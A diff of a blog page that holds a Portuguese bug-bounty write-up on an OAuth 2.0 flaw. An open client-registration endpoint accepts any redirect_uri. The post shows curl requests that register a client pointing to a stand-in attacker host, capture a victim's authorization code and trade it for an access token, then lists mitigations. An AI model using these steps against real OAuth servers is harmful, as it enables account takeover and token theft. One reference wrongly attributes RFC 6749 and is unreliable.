-    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
-</svg>
-
-</a>
-
-
-    
-
-
-
-
-    
-    
-        
-    
-
-    
-    
-        
-    
-
-
-
-    
-    <script async src="http://localhost:35729/js/main.js" ></script>
-
-    
-
-</body>
-</html>
+<!doctype html><html lang=en-gb><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=39773&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 | Obtuosa</title>
+<meta property="og:title" content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 | Obtuosa"><meta name=twitter:title content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 | Obtuosa"><meta itemprop=name content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 | Obtuosa"><meta name=application-name content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 | Obtuosa"><meta property="og:site_name" content="Obtuosa"><meta name=description content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web"><meta itemprop=description content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web"><meta property="og:description" content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web"><meta name=twitter:description content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web"><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=http://localhost:39773/posts/fluxos_oauth/ title=English><meta itemprop=image content="http://localhost:39773/images/oauth.png"><meta property="og:image" content="http://localhost:39773/images/oauth.png"><meta name=twitter:image content="http://localhost:39773/images/oauth.png"><meta name=twitter:image:src content="http://localhost:39773/images/oauth.png"><meta property="og:type" content="article"><meta property="og:article:published_time" content=2025-07-06T00:00:00Z><meta property="article:published_time" content=2025-07-06T00:00:00Z><meta property="og:url" content="http://localhost:39773/posts/fluxos_oauth/"><meta property="og:article:author" content><meta property="article:author" content><meta name=author content><script defer type=application/ld+json>{"@context":"http://schema.org","@type":"Article","headline":"O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0","author":{"@type":"Person","name":""},"datePublished":"2025-07-06","description":"Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web","wordCount":1979,"mainEntityOfPage":"True","dateModified":"2025-07-06","image":{"@type":"imageObject","url":"http:\/\/localhost:39773\/images\/oauth.png"},"publisher":{"@type":"Organization","name":"Obtuosa"}}</script><meta name=generator content="Hugo 0.131.0"><meta property="og:url" content="http://localhost:39773/posts/fluxos_oauth/"><meta property="og:site_name" content="Obtuosa"><meta property="og:title" content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0"><meta property="og:description" content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web"><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-07-06T00:00:00+00:00"><meta property="article:modified_time" content="2025-07-06T00:00:00+00:00"><meta property="article:tag" content="Oauth"><meta property="article:tag" content="Redirect_uri"><meta property="article:tag" content="Web"><meta property="article:tag" content="Recon"><meta name=twitter:card content="summary"><meta name=twitter:title content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0"><meta name=twitter:description content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web"><link rel=canonical href=http://localhost:39773/posts/fluxos_oauth/><link href=/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=http://localhost:39773/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"><link rel=icon type=image/svg+xml href=/icons/favicon.svg></head><body data-theme=dark class=notransition><script src=/js/theme.js></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=http://localhost:39773/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+</a><input type=checkbox id=menu-trigger class=menu-trigger>
+<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Início</a></li><li><a class="menu-link active" href=/posts/>Posts</a></li><li><a class=menu-link href=/pages/about/>Whoami</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0</h1><div class=post-meta><time datetime=2025-07-06T00:00:00+00:00 itemprop=datePublished>6 Jul 2025</time></div></header><div class=page-content><p><img alt="OAuth 2.0" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e1eyvg2f7wgnttm924b5.png></p><h1 id=o-impacto-da-manipulação-do-parâmetro-redirect_uri-em-fluxos-oauth-20-na-segurança-de-aplicações-web>O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 na segurança de Aplicações Web</h1><h2 id=resumo>Resumo</h2><blockquote><p>As aplicações web modernas enfrentam alguns desafios gradativos quanto a sua segurança, em virtude das integrações com serviços de autorização externos, como o protocolo OAuth 2.0 (Open Authorization), que se tornam cada vez mais comuns. Este texto tem propósito de investigar como uma manipulação inadequada no parâmetro <em>redirect_uri</em> em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web. Através de um estudo de caso prático de um report para uma plataforma de bug bounty, é possível analisar como um processo sistemático de reconhecimento e filtragem de subdomínios podem identificar vulnerabilidades, evidenciando a importância de boas práticas seguras de desenvolvimento e uma validação mais minuciosa de redirecionamentos autorizados.</p></blockquote><h2 id=palavras-chave>Palavras-chave</h2><p>Segurança Ofensiva; Aplicações web; OAuth; Reconhecimento; <em>redirect_uri</em></p><h2 id=1-introdução>1 Introdução</h2><p>Os sistemas web com o avanço tecnológico dependem cada vez mais de serviços externos para autenticação e autorização de usuários. Em consequência disso, protocolos como o OAuth 2.0 se tornam uma opção interessante de uso, por conta da flexibilidade e capacidade de integrar múltiplos serviços sem exigir o compartilhamento direto de credenciais sensíveis.</p><p>No entanto, essa grande flexibilidade pode também implicar em uma superfície de ataque mais ampliada. Em um contexto de falhas na configuração ao ser implementado ou a validação de parâmetros críticos não serem feitas da maneira apropriada, podem ocasionar em ataques com impacto real sobre a segurança dos usuários, uma vez que o OAuth é apenas um protocolo que ajuda um website ou aplicação a acessar recursos que estão hospedados em outros web apps em nome do usuário.</p><p>Este estudo se propõe a compreender como a manipulação do parâmetro <em>redirect_uri</em> em fluxos OAuth 2.0 pode compremeter a segurança de aplicações web, por meio de uma fundamentação teórica e um estudo prático realizado em ambiente de bug bounty, demonstrando em um cenário controlado como as falhas que aparentam ser simples podem resultar em um compromentimento da segurança.</p><h2 id=2-fundamentação-teórica>2 Fundamentação Teórica</h2><h3 id=21-protocolo-oauth-20>2.1 Protocolo OAuth 2.0</h3><p>O OAuth 2.0 (Open Authorization) é um protocolo para delegar autorização, assim permitindo que que um cliente terceiro possa ter acesso a um serviço HTTP, ou seja, clientes que podem acessar recursos em nome de um usuário, sem a necessidade de compartilhar as credenciais. A arquitetura é definida por alguns componentes importantes para seu sistema: <em>Proprietário do recurso (Resource Owner)</em>, a entidade que possui os dados protegidos, usuário final; <em>Cliente (Client)</em>, cliente que deseja ter acesso aos dados em nome do proprietário do recurso; <em>Servidor de recurso (Resource Server),</em> o servidor que será hospedados os recursos protegidos, sendo possível aceitar e também responder a solicitações usando tokens de acesso; <em>Servidor de autorização (Authorization Server)</em>, componente que realiza a autenticação do usuário e emite os tokens de acesso.</p><h3 id=22-fluxo-de-autorização-e-o-papel-do-parâmetro-redirect_uri>2.2 Fluxo de autorização e o papel do parâmetro <em>redirect_uri</em></h3><p>O servidor de autorização OAuth 2.0 retorna para uma melhor segurança um código de autorização (Authorization Code) e é a partir desse código que ocorre a troca por um token de acesso. Esse fluxo necessita da interação do usuário, que por sua vez concede a permissão necessária em uma tela de consentimento.</p><p>A partir desse contexto, um elemento importante nesse fluxo é o parâmetro <em>redirect_uri.</em> Ele indica para onde o servidor de autorização deve realizar o redirecionamento do usuário e por consequência o código de autorização após o consentimento.</p><p>Para a segurança, a especificação do OAuth (RFC674) precisa de validação rigorosa do <em>redirect_uri.</em> No contexto do estudo de caso, o uso desse parâmetro é feito de maneira deliberada, sem qualquer tipo de validação que possa previnir que os códigos de autorização que são confidenciais sejam enviados a domínios indevidos.</p><h3 id=23-impacto-da-falha-na-validação-do-redirect_uri>2.3 Impacto da falha na validação do <em>redirect_uri</em></h3><p>Se o servidor que implementa o OAuth 2.0 sem qualquer validação mais específica e restrita quanto ao <em>redict_uri,</em> pode levar a um atacante a registrar um cliente malicioso que pode deixar o <em>redirect_uri</em> sob seu controle, induzir uma possível vítima a se autenticar em uma tela legítima, já que essa falha é feita nos intermédios do próprio servidor onde o OAuth está alocado, receber o código de autorização dessa vítima e trocar por um token de acesso válido.</p><p>Essa falha afeta o modelo de confiança, na forma com que o protocolo é configurado, tornando assim possível ataques de phishing muito convincentes e comprometendo contas de usuários.</p><h2 id=3-metodologia>3 Metodologia</h2><p>Esta pesquisa foi realizada de forma estruturada e ética, em um ambiente controlado, por se tratar de um contexto de programa de bug bounty, com as regras apresentadas, sobre o que pode ou não ser feito dentro do escopo determinado. A base desse trabalho é ilustrar a partir do estudo de caso, como o reconhecimento e análise de endpoints, é possível revelar falhas, em específico fluxos de autenticação que são baseados no protocolo OAuth 2.0.</p><p>A etapa inicial consistiu em reconhecimento, entendendo modelo de negócios, posicionamento da empresa em questão no mercado. Para que isso fosse possível, foram analisadas as informações públicas disponíveis em plataformas de business intelligence, como o <strong>Crunchbase</strong>, além do próprio site oficial e a documentação técnica. Ademais, ocorreu o mapeamento da superfície de ataque, com o propósito de identificar endpoints públicos.</p><p>Ao longo da etapa, se fundamentou técnicas de enumeração de subdomínios, com ferramentas como <strong>assetfinder</strong>, <strong>subfinder</strong> e <strong>subcat</strong>. Adicionalmente, depois da enumeração dos subdomínios, também foi filtrado os que estavam “vivos” e retornando ao menos status code 200, 301 e 302, através da ferramenta <strong>httpx</strong>. Com a filtragem feita e a quantidade de subdomínios existentes, o <strong>katana</strong> foi usado para enumeração de endpoints, por se tratar de uma ferramenta de crawling automatizada, buscando uma navegação mais inteligente e prática. Como se tratava de múltiplos subdomínios, naquele momento foi julgado mais estratégico usar o katana para automatizar as descobertas de rotas. Em um desses momentos, havia um endpoint interessante, o /.well-know-oauth-authorization-server, um endpoint do protocolo OAuth. A resposta desse endpoint usando a ferramenta <strong>cURL</strong> trouxe informações interessantes sobre os parâmetros suportados, incluindo os endpoints de autorização (/authorize), de troca de tokens (/token) e registro de clientes (/register).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>HTTP/2 200 OK
+</span></span><span class=line><span class=cl>Cabeçalho
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Corpo:
+</span></span><span class=line><span class=cl>{&#34;issuer&#34;:&#34;https://subdominio.alvo&#34;,
+</span></span><span class=line><span class=cl>&#34;authorization_endpoint&#34;:&#34;https://subdominio.alvo/authorize&#34;,
+</span></span><span class=line><span class=cl>&#34;token_endpoint&#34;:&#34;https://subdominio.alvo/token&#34;,
+</span></span><span class=line><span class=cl>&#34;registration_endpoint&#34;:&#34;https://subdominio.alvo/register&#34;,
+</span></span><span class=line><span class=cl>&#34;response_types_supported&#34;:[&#34;code&#34;],&#34;response_modes_supported&#34;:[&#34;query&#34;],
+</span></span><span class=line><span class=cl>&#34;grant_types_supported&#34;:[&#34;authorization_code&#34;,&#34;refresh_token&#34;],
+</span></span><span class=line><span class=cl>&#34;token_endpoint_auth_methods_supported&#34;:[&#34;client_secret_post&#34;,
+</span></span><span class=line><span class=cl>&#34;client_secret_basic&#34;,&#34;none&#34;],
+</span></span><span class=line><span class=cl>&#34;registration_endpoint_auth_methods_supported&#34;:[&#34;client_secret_post&#34;,
+</span></span><span class=line><span class=cl>&#34;client_secret_basic&#34;,&#34;none&#34;],
+</span></span><span class=line><span class=cl>&#34;code_challenge_methods_supported&#34;:[&#34;S256&#34;]}
+</span></span></code></pre></div><p>Em seguida, realizou-se uma análise rigorosa com relação aos parâmetros aceitos por esses endpoints, com um foco maior no parâmetro <em>redrect_uri</em>, que pode se tornar sensível em contextos que aceitam qualquer tipo de valor. Neste ciclo, sucedeu observar se havia uma validação adequada do URI, de redirecionamento fornecido pelo cliente e se era possível dentro dessa dinâmica cadastrar domínios externos ou não confiáveis por meio do endpoint de registro.</p><p>O estágio seguinte refletiu no desenvolvimento de uma <strong>prova de conceito</strong> (PoC). Foram feitas requisições reais simulando o registro de um aplicativo com o parâmetro <em>redirect_uri</em> arbitrário, incluindo domínios externos sob o controle do pesquisador, que geraram um código de autorização válido. Em seguida, foi replicado o processo end-to-end, com a captura do código de autorização redirecionado para um domínio malicioso. Ao ser obtido, esse código foi trocado com sucesso por um token de acesso no endpoint /token, demonstrando a exploração efetiva da vulnerabilidade.</p><p>Em conclusão, toda a pesquisa foi documentada, com registro das requisiçõies realizadas, as respostas obtidas e as evidências que comprovam a obtenção de maneira indevida desses tokens. Esse registro é meramente educativo a fim de garantir a consistência dos resultados e permitir uma análise maior dos impactos, medidas corretivas necessárias, oferecer uma contribuição mais estruturada para uma discussão acadêmica e profissional sobre segurança em aplicações web.</p><h2 id=4-estudo-de-caso-exploração-do-redirect_uri>4 Estudo de caso: exploração do <em>redirect_uri</em></h2><h3 id=31-registro-do-aplicativo-malicioso>3.1 Registro do aplicativo malicioso</h3><p>Constatou-se que a rota /register aceitava registros de clientes com qualquer domínio que estivesse especificado como <em>redirect_uri,</em> sem validação.</p><p><strong>Requisição</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>curl -X POST https://subdominio.alvo/register \
+</span></span><span class=line><span class=cl>-H &#34;Content-Type: application/json&#34; \
+</span></span><span class=line><span class=cl>-d &#39;{
+</span></span><span class=line><span class=cl>  &#34;client_name&#34;: &#34;App_malicioso&#34;,
+</span></span><span class=line><span class=cl>  &#34;redirect_uris&#34;: [&#34;https://atacante.com&#34;],
+</span></span><span class=line><span class=cl>  &#34;grant_types&#34;: [&#34;authorization_code&#34;],
+</span></span><span class=line><span class=cl>  &#34;response_types&#34;: [&#34;code&#34;]
+</span></span><span class=line><span class=cl>}&#39;
+</span></span></code></pre></div><p><strong>Resposta:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;client_id&#34;</span><span class=p>:</span> <span class=s2>&#34;APP_MALICIOSO_ID&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;client_secret&#34;</span><span class=p>:</span> <span class=s2>&#34;SECRET&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;redirect_uris&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;https://atacante.com&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><h3 id=42-fluxo-de-autenticação>4.2 Fluxo de autenticação</h3><p>Na sequência, o atacante poderia direcionar a vítima a rota /authorize com o <em>client_id</em> gerado **e o <em>redirect_uri</em> malicioso.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>https://subdominio.alvo/authorize?response_type<span class=o>=</span>code<span class=p>&amp;</span><span class=nv>client_id</span><span class=o>=</span>APP_MALICIOSO_ID<span class=p>&amp;</span><span class=nv>redirect_uri</span><span class=o>=</span>REDIRECT_URI
+</span></span></code></pre></div><p>Após a autenticação e o consentimento na tela do próprio domínio legítimo, o servidor de autorização redirecionava para o <em>redirect_uri</em> externo registrado e assim deixava exposto o código de autorização na URL.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>https://atacante.com/?code<span class=o>=</span>_CODE_
+</span></span></code></pre></div><h3 id=43-troca-do-código-por-token-de-acesso>4.3 Troca do código por Token de Acesso</h3><p>Com o código obtido, o atacante solicitava um token de acesso legítimo da vítima.</p><p><strong>Requisição</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -X POST https://subdominio.alvo/token <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>  -d <span class=s2>&#34;grant_type=authorization_code&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>  -d <span class=s2>&#34;code=_CODE_&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>  -d <span class=s2>&#34;redirect_uri=https://atacante.com&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>  -d <span class=s2>&#34;client_id=APP_MALICIOSO_ID&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>  -d <span class=s2>&#34;client_secret=SECRET&#34;</span>
+</span></span></code></pre></div><p><strong>Resposta</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;access_token&#34;</span>: <span class=s2>&#34;TOKEN&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;expires_in&#34;</span>: 3600,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;token_type&#34;</span>: <span class=s2>&#34;bearer&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><h2 id=5-resultados-e-discussão>5 Resultados e Discussão</h2><p>Os resultados demonstram a falha decorrente da validação inadequada do parâmetro <em>redirect_uri</em> em fluxos OAuth 2.0 ao ser implementada sem a análise de como o servidor irá reagir diante de um domínio “estranho”. A análise prática evidenciou, que ao permitir de maneira deliberada o registro de clientes com URIs de redirecionamento totalmente arbitrários e externos, o servidor de autorização expõe um vetor de ataque, que pode ser explorado por agentes maliciosos.</p><p>Um dos principais pontos é a possibilidade de interceptação de códigos de autorização válidos. Durante a execução da PoC, após o login e consentimento do usuário em uma interface oficial da própria aplicação, o servidor redirecionava o código de autorização para outra url registrada pelo atacante. Esse comportamento quebra o modelo de confiança na implementação do OAuth 2.0, quando não se tem uma verificação mais rigorosa por parte da aplicação que o incorpora.</p><p>Outro aspecto relevante é que os testes puderam confirmar a troca bem-sucedida do código de autorização interceptado por um token de acesso válido no endpoint /token. Assim, poderia ser utilizado para acessar recursos protegidos em nome do usuário alvo, possibilitando um risco de obtenção não autorizada de dados sensíveis.</p><p>Vale ressaltar ainda que existe um potencial em ataques de phishing, com grande grau de credibilidade. Por se tratar de um fluxo de autenticação por meio da própria aplicação legítima e autorizada, o usuário teria uma maior confiança no processo, mesmo com o redirecionamento malicioso. Essa característica aumenta o poder de persuasão de uma campanha de engenharia social se baseando nesse vetor.</p><p>Ressalta-se o papel importante da etapa de reconhecimento na identificação da vulnerabilidade. A partir do mapeamento dos endpoints e a inspeção das respostas do servidor, em especial do endpoint /.well-known/oauth-authorization-server, permitiu entender de forma sistemática pontos sensíveis do fluxo de autenticação.</p><p>Os pontos de exposição validam a necessidade de boas práticas de segurança no desenvolvimento e manutenção de sistemas que implementam OAuth. Desde a validação mais metódica com relação ao parâmetro fragilizado, que possam restringir os redirecionamentos indevidos, a implementação do PKCE (Proof Key for Code Exchange) para clientes públicos e aplicações, como forma de mitigar o roubo de códigos de autorização e por fim, auditorias regulares, que possam realizar revisões sistemáticas de endpoints, parâmetros sensíveis e mecanismos de registros de clientes.</p><p>É importante enfatizar a importância de abordagens proativas em segurança de aplicações web, evidenciando o valor da análise ofensiva mais controlada por parte de plataformas bug bounty e uma estratégia complementar nas práticas tradicionais de desenvolvimento seguro.</p><h2 id=6-conclusão>6 Conclusão</h2><p>A manipulação inadequada do parâmetro <em>redirect_uri</em> no protocolo OAuth 2.0 de autorização apresenta uma vulnerabilidde que pode comprometer a segurança de aplicações web. O estudo de caso demonstra como uma exploração prática pode culminar no roubo de códigos de autorização e a obtenção indevida de tokens de acesso.</p><p>Isso evidencia a importância de processos de reconhecimento e a análise sistemática de endpoints, bem como a implementação mais rigorosa quanto a práticas seguras de desenvolvimento para que seja possível mitigar esses riscos.</p><h2 id=referências>Referências</h2><p>ASSOCIATION FOR THE ADVANCEMENT OF RETIRED PERSONS. <em>RFC 6749 – The OAuth 2.0 Authorization Framework</em>. Disponível em: <a href=https://datatracker.ietf.org/doc/html/rfc6749>https://datatracker.ietf.org/doc/html/rfc6749</a>.</p><p>INTERNET ENGINEERING TASK FORCE. <em>RFC 6819 – OAuth 2.0 Threat Model and Security Considerations</em>. Disponível em: <a href=https://datatracker.ietf.org/doc/html/rfc6819>https://datatracker.ietf.org/doc/html/rfc6819</a>.</p><p>OWASP FOUNDATION. <em>Testing for OAuth Weaknesses</em>. Disponível em: <a href=https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses</a>.</p><p>PORTSWIGGER. <em>OAuth Authentication Security</em>. Disponível em: <a href=https://portswigger.net/web-security/oauth>https://portswigger.net/web-security/oauth</a>.</p><h2 id=heading></h2></div></article></main></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/obtuosa target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
+</a><a href=/index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2025 .
+Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentcolor" stroke="currentcolor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
+</a><script async src=http://localhost:39773/js/main.js></script></body></html>
